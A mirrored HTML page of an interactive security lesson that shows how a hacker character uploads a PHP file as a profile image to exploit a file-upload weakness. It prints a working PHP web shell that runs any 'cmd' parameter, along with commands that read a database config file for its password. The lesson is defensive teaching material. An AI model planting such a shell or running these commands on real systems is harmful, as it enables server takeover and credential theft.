@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from www. .com/exercises/file-upload by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Aug 2023 12:47:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+  <title>File Upload Vulnerabilities</title>
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://d1o5lmfp4gliop.cloudfront.net/assets/favicon-d2fd4b2666fd6a6c2eacee13d0d844a558942079e549b7f971085de9cab55511.ico" />
+
+  <link rel="apple-touch-icon"                 href="../touch-icon-iphone.png">
+  <link rel="apple-touch-icon" sizes="76x76"   href="../touch-icon-ipad.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="../touch-icon-iphone-retina.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="../touch-icon-ipad-retina.png">
+
+  <meta name="viewport" content="width=device-width">
+
+  <link rel="stylesheet" media="all" href="../../d1o5lmfp4gliop.cloudfront.net/assets/application-1f27c21e9caba5e224e9039708363bb3d6393bcd0cec34182ef97d314c3d7fe1.css" />
+  <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/application-9865c3a61c1ffdfed4986c79c8214c39119b9dd0fa2157ea9bdc023c8edbd459.js"></script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="ggO4J3SygG+9yNN39mho9OREfyJ9e0OJW/ocGtR7H0wbEzUV9ejgUXDmXv5Z0BITAP3rDGj0XkA4jnhLlnBHvw==" />
+
+  
+
+  <meta property="og:url"          content="https://www. .com/exercises/file-upload" />
+<meta property="og:type"         content="website" />
+<meta property="og:title"        content="File Upload Vulnerabilities" />
+<meta property="og:description"  content="File uploads should be treated with caution - they represent an easy way for an attacker to inject malicious code into your application. Let&#39;s review a typical exploitation scenario. →" />
+<meta property="og:image"        content="https://www. .comhttps://d1o5lmfp4gliop.cloudfront.net/images/exercises/file-upload/screenshot.png" />
+<meta property="og:site_name"    content=" "/>
+
+<meta property="fb:app_id"       content="495778420623064">
+
+<meta name="description"         content="File uploads should be treated with caution - they represent an easy way for an attacker to inject malicious code into your application. Let&#39;s review a typical exploitation scenario. →" />
+
+<meta name="twitter:title"       content="File Upload Vulnerabilities">
+<meta name="twitter:description" content="File uploads should be treated with caution - they represent an easy way for an attacker to inject malicious code into your application. Let&#39;s review a typical exploitation scenario. → %>">
+
+<meta name="application-name"                content=" "/>
+<meta name="msapplication-TileColor"         content="#000000"/>
+<meta name="msapplication-square70x70logo"   content="windows-tiny.png"/>
+<meta name="msapplication-square150x150logo" content="windows-square.png"/>
+<meta name="msapplication-wide310x150logo"   content="windows-wide.png"/>
+<meta name="msapplication-square310x310logo" content="windows-large.png"/>
+
+
+  
+
+
+
+</head>
+
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-SZ91HC6JB6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-SZ91HC6JB6');
+  </script>
+
+
+
+<body class="white logged-out exercises file_upload unknown_device unknown_browser unknown_browser0 windows non-ie">
+
+  <div class="content">
+
+
+      
+  <div class="exercise-title">
+    <a href="#">
+      <div class="inline">
+        <img class="logo" src="../../d1o5lmfp4gliop.cloudfront.net/images/exercises/file-upload/icon.gif" />
+      </div>
+
+      <div class="inline title">
+        <div>
+          File Upload Vulnerabilities
+        </div>
+        <div class="tracking"></div>
+      </div>
+
+      <a class="back-to-lessons" href="../lessons.html">
+        <i class="fa fa-times-circle back-icon"></i>
+        <div class="back-label">Exit</div>
+</a>    </a>
+  </div>
+
+
+    <noscript>
+  <div class="row">
+    <p class="alert alert-danger no-script">
+      This site needs JavaScript to work!
+    </p>
+  </div>
+</noscript>
+
+    <div class="main exercise">
+
+      <div class="card-holder">
+        <div id="intro" class="intro">
+          <a id="start-exercise" href="#start">
+            <div class="card">
+
+  <div class="img porthole" style="background-color: white; background-position: center; background-repeat: no-repeat; background-image: url('../../d1o5lmfp4gliop.cloudfront.net/images/exercises/file-upload/icon.gif')"></div>
+
+  <div class="strip">
+    File Upload Vulnerabilities
+  </div>
+  <div class="blurb">
+
+    <p>File uploads should be treated with caution - they represent an easy way for an attacker to inject malicious code into your application.</p>
+
+    <p>
+      <strong>
+        Let's review a typical exploitation scenario.
+      </strong>
+    </p>
+
+  </div>
+</div>
+
+          </a>
+        </div>
+      </div>
+
+      <div class="lesson-holder">
+        <div class="lesson"
+             data-name="File Upload Vulnerabilities"
+             data-id="file_upload"
+             data-captions="on" >
+
+          
+        <div id="file-upload" class="container">
+  <div class="row top">
+
+    <div class="col-md-3"></div>
+
+    <div class="col-md-6">
+
+      <a class="unselectable" href="#tempting-opportunity"><div id="start" class=" instruction" title="Start" introductory="true" next="tempting-opportunity">
+
+        File upload functions are a favorite target for hackers,
+        because they require your site to take a large chunk of data
+        and write it to disk.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#simple-example"><div id="tempting-opportunity" class=" instruction" title="A Tempting Opportunity" introductory="true" next="simple-example">
+
+        This gives attackers the opportunity to smuggle malicious scripts
+        onto your server.  If they can subsequently find a way to <strong>execute</strong>
+        those scripts, they can compromise your entire system.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#introducing-mal"><div id="simple-example" class=" instruction" title="A Simple Example" introductory="true" next="introducing-mal">
+
+        Let's see how an attack might work. <strong>This is based on a
+        real-world example.</strong>
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="../prevention/file-upload.html"><div id="finish" class=" instruction" show="" title="How do we prevent this?">
+
+        <div class="icon">
+          <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/skull-56af21599bf07cebbffbecceec1537a9471628fb1d3374433c1d9b8b1ab703bf.png" />
+        </div>
+
+        <div class="message">
+          <strong>Pretty frightening, right?</strong>
+          Now that we've seen one particular way file uploads can make your site vulnerable,
+          we had better learn how to implement this kind of functionality safely.
+        </div>
+
+<div class="next"></div></div></a>
+    </div>
+
+    <div class="col-md-3"></div>
+
+  </div>
+
+  <div class="row bottom">
+
+    <div class="col-md-3 captions">
+
+      <a class="unselectable" href="#mal-notices"><div id="introducing-mal" class=" instruction" show="#mal-preparing,#thinks-1" title="Introducing Mal" fx="mumble" next="mal-notices">
+
+        <strong>Mal</strong> is a hacker that has signed up for a website
+        running on a popular content management system.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#observation-1"><div id="mal-notices" class=" instruction" show="#mal-pensive,#profile-edit" title="Mal Notices Something" fx="mumble" next="observation-1">
+
+        He has noticed a couple of things about the site's profile image upload function.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#observation-2"><div id="observation-1" class=" instruction" show="#mal-pensive,#thinks-2,#profile-edit-upload-dialog" title="First Observation" fx="mumble" next="observation-2">
+
+        Firstly, uploaded files do not get renamed as part of the
+        upload process. The file name appears in the URL of the profile image
+        when it is published.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#writing-the-script"><div id="observation-2" class=" instruction" show="#mal-pensive,#thinks-3,#profile-edit-upload-dialog" title="Second Observation" fx="laugh" next="writing-the-script">
+
+        Secondly, file-type checking is done in JavaScript.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#uploading-with-js-disabled"><div id="writing-the-script" class=" instruction" show="#mal-hacking,.script" title="Writing the Script" next="uploading-with-js-disabled">
+
+        Mal writes a simple script called <strong>hack.php</strong>.
+        When this web shell is executed by PHP, it will run any command
+        passed in the "cmd" parameter.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#broken-profile-image"><div id="uploading-with-js-disabled" class=" instruction" show="#mal-hacking,#upload,#thinks-4,#uploading,#uploading-profile-image" title="Uploading with JavaScript Disabled" fx="laugh" next="broken-profile-image">
+
+        He disables JavaScript in his browser, and uploads <strong>hack.php</strong>
+        as his profile image. Since JavaScript is disabled, the file type is not
+        checked.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#direct-access"><div id="broken-profile-image" class=" instruction" show="#mal-hacking,#profile,#broken-profile" title="A Broken Profile Image" next="direct-access">
+
+        Unsurprisingly, his profile looks broken - the file he uploaded is
+        not a valid image.  <strong>However, the script now lives on the server.</strong>
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#attack-vector-established"><div id="direct-access" class=" instruction" show="#mal-hacking,#hack-1,#thinks-5" title="Path Accessed Directly" trigger="highlightURL" fx="laugh" next="attack-vector-established">
+
+        Dropping the URL of the "profile image" in the browser address bar
+        causes the script to be executed.
+
+<div class="next"></div></div></a>
+      <script>
+        function highlightURL() {
+          $("#hack-1 .address")
+            .stop()
+            .animate({backgroundColor: "#cccc9C"}, 400)
+            .animate({backgroundColor: "#ffffff"}, 400)
+            .animate({backgroundColor: "#cccc9C"}, 400)
+            .animate({backgroundColor: "#ffffff"}, 400)
+            .animate({backgroundColor: "#cccc9C"}, 400)
+            .animate({backgroundColor: "#ffffff"}, 400);
+        }
+      </script>
+
+      <script>
+        function scrollCommandIntoView() {
+          setTimeout(function() {
+            $(".address").animate({ scrollLeft: 500 }, 2000);
+          }, 1200)
+        }
+      </script>
+
+      <a class="unselectable" href="#locate-the-database-config"><div id="attack-vector-established" class=" instruction" show="#mal-hacking,#command-goes-here" title="Attack Vector Established" trigger="scrollCommandIntoView" next="locate-the-database-config">
+
+        In fact, any command passed in the "cmd" parameter will get executed on the server.
+        His upload has created a <strong>command execution</strong> vulnerability.
+
+<div class="next"></div></div></a>
+      <a class="unselectable" href="#command-execution"><div id="locate-the-database-config" class=" instruction" show="#mal-hacking,#find-the-file,.pointing" title="Finding Sensitive Files" trigger="scrollCommandIntoView" transcript="Let&#39;s help Mal get access to sensitive data on the server. We will pass a command to find a database config file." next="command-execution" await="true">
+
+        <strong>Help Mal get access to sensitive data on the server.</strong>
+        Pass in the <code>locate my.cnf</code> command to find a database config
+        file.
+
+<div class="next hidden"></div></div></a>
+      <a class="unselectable" href="#finish"><div id="command-execution" class=" instruction" show="#mal-hacking,#read-the-file,.pointing" title="Getting Database Access" trigger="scrollCommandIntoView" transcript="Now we invoke the cat command to read the file and discover the database password." next="finish" await="true">
+
+        <strong>Good job!</strong> Now invoke the <code>cat /etc/mysql/my.cnf</code>
+        command to read the file and discover the database password.
+
+<div class="next hidden"></div></div></a>
+    </div>
+
+    <div class="col-md-3 left-panel">
+
+      <img class="character hide-by-default" id="mal-preparing" src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-preparing-06c19221aa11811471e37995f4a4ae85b601d7ce2a85005cbd74bbdabf2112a3.png" />
+      <img class="character hide-by-default" id="mal-pensive" src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-pensive-8d7c379108d248ef5c8e97ae7859a0f6dbc29bc0a21c658581f658c54b4fd95b.png" />
+      <img class="character hide-by-default" id="mal-hacking" src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-hacking-c3cda4bec0235fcfe36c50e49ef7a01aba5e01ea4c9448217b2fbaa268c52d12.png" />
+      <img class="character hide-by-default" id="mal-succeed" src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-succeed-e1a6deb1c9d0b37eaae079dcbd6e0333626bf85cdd89fb8069a6d1654215b3ab.png" />
+
+      <span id="thinks-1" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        What fun I will have in my basement today!
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="thinks-2" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        I feel a hack approaching.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="thinks-3" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        Oooh, it's getting real close.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="thinks-4" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        EAT MY HACK, mwah ha ha.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="thinks-5" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        I AM GREATLY PLEASED.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="thinks-6" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        There it is! Thank you kindly.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+    </div>
+
+    <div class="col-md-6 illustrations">
+
+      <div id="profile-edit"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">example.com/profile/edit</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+  <div class="profile profile-edit">
+    <img class="file-chooser" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/file-chooser-26c9736ed4b7c7b079d77051dbd55aa3bd807d86505e468cf468485eef93fa1f.png" />
+
+    <div class="heading">
+      YOUR PROFILE
+    </div>
+
+    <div class="uploading">
+      <div class="bar"></div>
+      <div class="message">UPLOADING...</div>
+    </div>
+
+      <img class="image" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/anon-66b6223167e2a180c6c8f8b2890213a95b6eb51815a997e00d0b3b9e2398814a.jpg" />
+
+    <div class="title">
+      &nbsp; USERNAME <img class="edit-icon" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/edit-d55a23cdd1c3008fc7fc9b72d53b6fd14c3e5e3641542098601b253126008591.png" />
+    </div>
+
+    <div>
+      Mal
+    </div>
+  </div>
+
+
+  </div>
+</div>
+
+      <div id="profile-edit-upload-dialog"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">example.com/profile/edit</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+  <div class="profile profile-edit">
+    <img class="file-chooser" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/file-chooser-26c9736ed4b7c7b079d77051dbd55aa3bd807d86505e468cf468485eef93fa1f.png" />
+
+    <div class="heading">
+      YOUR PROFILE
+    </div>
+
+    <div class="uploading">
+      <div class="bar"></div>
+      <div class="message">UPLOADING...</div>
+    </div>
+
+      <img class="image" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/anon-66b6223167e2a180c6c8f8b2890213a95b6eb51815a997e00d0b3b9e2398814a.jpg" />
+
+    <div class="title">
+      &nbsp; USERNAME <img class="edit-icon" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/edit-d55a23cdd1c3008fc7fc9b72d53b6fd14c3e5e3641542098601b253126008591.png" />
+    </div>
+
+    <div>
+      Mal
+    </div>
+  </div>
+
+
+  </div>
+</div>
+
+      <pre  class="snippet  script hide-by-default"><code class="php bad">&lt;?php
+  if(isset($_REQUEST[&#39;cmd&#39;])) {
+    $cmd = ($_REQUEST[&#39;cmd&#39;]);
+    system($cmd);
+  } else {
+    echo &quot;What is your bidding?&quot;;
+  }
+?&gt;</code><img class="icon" src="../../d1o5lmfp4gliop.cloudfront.net/assets/icons/danger-82cdabffb9e70795f6fdd5d10c7d88af3e188843f766ac02c7e4b990481d4cd2.png" /></pre>      <div class="script hide-by-default caption">
+        A simple web shell, which when executed by PHP, will run any command
+        passed in the "cmd" parameter.
+      </div>
+
+      <div id="uploading" class="hide-by-default">
+        <div id="uploading-profile-image"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">example.com/profile/edit</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+  <div class="profile profile-edit">
+    <img class="file-chooser" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/file-chooser-26c9736ed4b7c7b079d77051dbd55aa3bd807d86505e468cf468485eef93fa1f.png" />
+
+    <div class="heading">
+      YOUR PROFILE
+    </div>
+
+    <div class="uploading">
+      <div class="bar"></div>
+      <div class="message">UPLOADING...</div>
+    </div>
+
+      <img class="image" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/anon-66b6223167e2a180c6c8f8b2890213a95b6eb51815a997e00d0b3b9e2398814a.jpg" />
+
+    <div class="title">
+      &nbsp; USERNAME <img class="edit-icon" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/edit-d55a23cdd1c3008fc7fc9b72d53b6fd14c3e5e3641542098601b253126008591.png" />
+    </div>
+
+    <div>
+      Mal
+    </div>
+  </div>
+
+
+  </div>
+</div>
+      </div>
+
+      <div id="broken-profile"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">example.com/profile/edit</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+  <div class="profile profile-edit">
+    <img class="file-chooser" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/file-chooser-26c9736ed4b7c7b079d77051dbd55aa3bd807d86505e468cf468485eef93fa1f.png" />
+
+    <div class="heading">
+      YOUR PROFILE
+    </div>
+
+    <div class="uploading">
+      <div class="bar"></div>
+      <div class="message">UPLOADING...</div>
+    </div>
+
+      <div class="image broken">
+        <img class="broken" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/broken-6788a5d6f41c6341c569a53e4d8723fbe926a035393d8d9decb89500074dd31b.gif" />
+      </div>
+
+    <div class="title">
+      &nbsp; USERNAME <img class="edit-icon" src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/file-upload/edit-d55a23cdd1c3008fc7fc9b72d53b6fd14c3e5e3641542098601b253126008591.png" />
+    </div>
+
+    <div>
+      Mal
+    </div>
+  </div>
+
+
+  </div>
+</div>
+
+      <div id="hack-1"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">cdn.example.com/1a2fe/hack.php</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+        <div class="hacked">What is your bidding?</div>
+
+
+  </div>
+</div>
+      <div id="command-goes-here" class="browser hide-by-default interactive">
+        <div class="nav">
+          <span class="buttons">
+            <span class="button red">    </span>
+            <span class="button orange"> </span>
+            <span class="button green">  </span>
+          </span>
+          <div class="url">
+            <div class="address">cdn.example.com/1a2fe/hack.php?cmd=<strong>command+goes+here</strong></div>
+            <div class="load-icon"></div>
+          </div>
+        </div>
+        <div class="frame">
+          <div class="shell-output hacked">
+
+          </div>
+        </div>
+      </div>
+
+      <div class="pointing bounce hide-by-default">
+        <span class="fa fa-arrow-circle-o-down">
+        </span>
+      </div>
+
+      <div id="find-the-file" class="browser hide-by-default interactive">
+        <div class="nav">
+          <span class="buttons">
+            <span class="button red">    </span>
+            <span class="button orange"> </span>
+            <span class="button green">  </span>
+          </span>
+          <div class="url">
+            <div class="address">cdn.example.com/1a2fe/hack.php?cmd=<input type="text" class="query-param" autocorrect="off" autocapitalize="none" placeholder="locate my.cnf"></input></div>
+            <div class="load-icon"></div>
+          </div>
+        </div>
+        <div class="frame">
+          <div class="shell-output hacked">
+            
+          </div>
+        </div>
+      </div>
+
+      <script>
+        $(function() {
+          var input1 = $("#find-the-file .query-param");
+
+          input1.keypress(function(event) {
+            if (event.which == 13) {
+              $.getJSON('https://www. .com/exercises/file-upload/shell?cmd=' + input1.val(), function(response) {
+                $("#find-the-file .shell-output").html(response.output);
+                $("#read-the-file .shell-output").html(response.output);
+
+                if (response.event == 'found') {
+                  input1.blur();
+                  nextStep();
+                }
+              });
+            }
+            else {
+              setTimeout(function() {
+                input1.val(input1.val().replace(' ', '+'));
+              }, 100);
+            }
+          });
+
+          var input2 = $("#read-the-file .query-param");
+
+          input2.keypress(function(event) {
+            if (event.which == 13) {
+              $.getJSON('https://www. .com/exercises/file-upload/shell?cmd=' + input2.val(), function(response) {
+                $("#find-the-file .shell-output").html(response.output);
+                $("#read-the-file .shell-output").html(response.output);
+
+                if (response.event == 'read') {
+                  $("#mal-hacking").hide();
+                  $("#mal-succeed").show();
+
+                  thinks("#thinks-6");
+
+                  $(".pointing").hide();
+
+                  input2.blur();
+
+                  $(".current")
+                    .removeClass("waiting")
+                    .removeAttr("await")
+                    .append('<div class="next"></div>');
+                }
+              });
+            } else {
+              setTimeout(function() {
+                input2.val(input2.val().replace(' ', '+'));
+              }, 100);
+            }
+          });
+        })
+      </script>
+
+      <div id="read-the-file" class="browser hide-by-default interactive">
+        <div class="nav">
+          <span class="buttons">
+            <span class="button red">    </span>
+            <span class="button orange"> </span>
+            <span class="button green">  </span>
+          </span>
+          <div class="url">
+            <div class="address">cdn.example.com/1a2fe/hack.php?cmd=<input type="text" class="query-param" autocorrect="off" autocapitalize="none" placeholder="cat /etc/mysql/my.cnf"></input></div>
+            <div class="load-icon"></div>
+          </div>
+        </div>
+        <div class="frame">
+          <div class="shell-output hacked">
+
+          </div>
+        </div>
+      </div>
+      
+    </div>
+
+  </div>
+</div>
+
+
+        </div>
+
+
+          
+
+
+
+
+      </div>
+
+    </div>
+
+
+    <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercise-5652b5b649e3d7688a1c4e39179541168716b52f4d2d6c72ea0210af3eebe078.js"></script>
+
+
+
+
+
+
+  </div>
+
+    <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/cookieinfo-1af9cc137c2c2bc8ea4d469f45d357ec43dc6c23537bd0c96aa9b51ff416ce5e.js" id="cookieinfo"></script>
+
+</body>
+
+<script>
+  $(function () {
+    $('[data-bs-toggle="tooltip"]').tooltip({ container: 'body' });
+  });
+</script>
+
+
+<!-- Mirrored from www. .com/exercises/file-upload by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Aug 2023 12:47:14 GMT -->
+</html>
